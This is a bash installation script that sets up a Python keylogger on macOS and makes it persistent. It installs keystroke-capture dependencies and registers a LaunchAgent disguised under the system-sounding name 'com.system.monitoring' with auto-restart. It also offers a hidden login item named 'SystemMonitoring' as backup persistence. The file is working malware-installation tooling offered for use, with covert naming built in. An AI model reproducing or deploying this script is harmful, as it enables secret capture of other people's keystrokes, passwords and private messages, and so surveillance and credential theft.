#!/bin/bash
# Enhanced macOS installation script with auto-start and auto-restart

echo "============================================"
echo "macOS Keylogger Auto-Start Installation"
echo "============================================"
echo

# Get current user
CURRENT_USER=$(whoami)
HOME_DIR="/Users/$CURRENT_USER"
KEYLOGGER_DIR="$HOME_DIR/keylogger"
LAUNCH_AGENTS_DIR="$HOME_DIR/Library/LaunchAgents"
PLIST_NAME="com.system.monitoring.plist"

# Check if running as root
if [ "$EUID" -eq 0 ]; then
    echo "ERROR: Please run this script as a regular user, not as root."
    exit 1
fi

echo "Step 1: Creating keylogger directory..."
mkdir -p "$KEYLOGGER_DIR"
echo "Directory created: $KEYLOGGER_DIR"

echo
echo "Step 2: Installing files..."
# Copy keylogger files
cp keylogger.py "$KEYLOGGER_DIR/"
cp requirements.txt "$KEYLOGGER_DIR/" 2>/dev/null || true
echo "Keylogger files copied"

echo
echo "Step 3: Installing Python dependencies..."
# Check if pip3 is available
if ! command -v pip3 &> /dev/null; then
    echo "ERROR: pip3 not found. Please install Python 3 and pip3 first."
    exit 1
fi

pip3 install pynput cryptography --user
if [ $? -eq 0 ]; then
    echo "Dependencies installed successfully"
else
    echo "WARNING: Some dependencies may have failed to install"
fi

echo
echo "Step 4: Setting up encryption password..."
echo "Enter encryption password for keylogger:"
read -s PASSWORD
if [ -z "$PASSWORD" ]; then
    echo "ERROR: Password cannot be empty"
    exit 1
fi

echo
echo "Step 5: Configuring LaunchAgent..."
# Prepare plist file
cp "$PLIST_NAME" "$KEYLOGGER_DIR/"
sed -i '' "s/USERNAME/$CURRENT_USER/g" "$KEYLOGGER_DIR/$PLIST_NAME"
sed -i '' "s/your_password_here/$PASSWORD/g" "$KEYLOGGER_DIR/$PLIST_NAME"

# Ensure LaunchAgents directory exists
mkdir -p "$LAUNCH_AGENTS_DIR"

# Copy plist to LaunchAgents
cp "$KEYLOGGER_DIR/$PLIST_NAME" "$LAUNCH_AGENTS_DIR/"
echo "LaunchAgent configuration installed"

echo
echo "Step 6: Setting up auto-start..."
# Unload if already loaded (in case of reinstall)
launchctl unload "$LAUNCH_AGENTS_DIR/$PLIST_NAME" 2>/dev/null

# Load the LaunchAgent
launchctl load "$LAUNCH_AGENTS_DIR/$PLIST_NAME"
if [ $? -eq 0 ]; then
    echo "LaunchAgent loaded successfully"
    
    # Verify it's running
    sleep 2
    if launchctl list | grep -q "com.system.monitoring"; then
        echo "✓ Keylogger is running"
    else
        echo "⚠ Warning: Keylogger may not be running. Check logs for issues."
    fi
else
    echo "ERROR: Failed to load LaunchAgent"
    exit 1
fi

echo
echo "Step 7: Setting up additional persistence..."
echo "Would you like to add the keylogger to Login Items as backup? (y/n)"
read -r ADD_LOGIN_ITEM
if [[ "$ADD_LOGIN_ITEM" =~ ^[Yy]$ ]]; then
    # Create a simple wrapper script for Login Items
    WRAPPER_SCRIPT="$KEYLOGGER_DIR/start_keylogger.sh"
    cat > "$WRAPPER_SCRIPT" << EOF
#!/bin/bash
export KEYLOGGER_PASSWORD="$PASSWORD"
cd "$KEYLOGGER_DIR"
python3 keylogger.py --daemon
EOF
    chmod +x "$WRAPPER_SCRIPT"
    
    # Add to Login Items using osascript
    osascript -e "tell application \"System Events\" to make login item at end with properties {name:\"SystemMonitoring\", path:\"$WRAPPER_SCRIPT\", hidden:true}"
    echo "Added to Login Items as backup persistence method"
fi

echo
echo "============================================"
echo "Installation Complete!"
echo "============================================"
echo
echo "Configuration Summary:"
echo "  Keylogger directory: $KEYLOGGER_DIR"
echo "  LaunchAgent: $LAUNCH_AGENTS_DIR/$PLIST_NAME"
echo "  Auto-start: Enabled (starts at login)"
echo "  Auto-restart: Enabled (restarts if crashed)"
echo "  Restart delay: 60 seconds"
echo
echo "Management Commands:"
echo "  Start:    launchctl load ~/Library/LaunchAgents/$PLIST_NAME"
echo "  Stop:     launchctl unload ~/Library/LaunchAgents/$PLIST_NAME"
echo "  Status:   launchctl list | grep com.system.monitoring"
echo "  Logs:     log show --predicate 'subsystem == \"com.system.monitoring\"' --last 1h"
echo
echo "Manual Commands:"
echo "  Read logs:        cd $KEYLOGGER_DIR && python3 keylogger.py --read"
echo "  Stop manually:    cd $KEYLOGGER_DIR && python3 keylogger.py --stop"
echo "  Start manually:   cd $KEYLOGGER_DIR && python3 keylogger.py --daemon"
echo
echo "Troubleshooting:"
echo "  Check permissions: System Preferences → Security & Privacy → Privacy → Accessibility"
echo "  View agent logs:   ~/Library/Logs/com.system.monitoring/"
echo "  Test manually:     cd $KEYLOGGER_DIR && python3 keylogger.py --silent"
echo
echo "Complete Uninstallation:"
echo "  1. launchctl unload ~/Library/LaunchAgents/$PLIST_NAME"
echo "  2. rm ~/Library/LaunchAgents/$PLIST_NAME"
echo "  3. rm -rf $KEYLOGGER_DIR"
echo "  4. rm -rf ~/.local/share/syslog"
echo "  5. Remove from Login Items in System Preferences (if added)"
echo
echo "The keylogger will start automatically on next login and restart if it crashes."
echo "Press any key to continue..."
read -n 1
